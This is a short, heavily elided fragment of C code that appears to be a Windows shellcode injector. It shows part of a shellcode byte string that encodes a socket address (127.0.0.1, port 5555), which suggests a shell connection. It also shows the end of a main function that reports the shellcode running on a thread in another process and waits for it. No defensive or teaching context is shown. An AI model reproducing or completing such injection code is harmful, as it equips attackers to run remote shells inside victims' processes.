...
"\x89\xe5\x49\xbc\x02\x00\x15\xb3\x7f\x00\x00\x01\x41\x54"
...
int main(int argc, char* argv[]) {
    ...
    if(hThread==NULL) {
        printf("%s coudnt start thread, error: %ld\n",e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s shellcode running on thread\n",i);
    
    WaitForSingleObject(hThread, INFINITE);

    printf("%s finished execution", k);
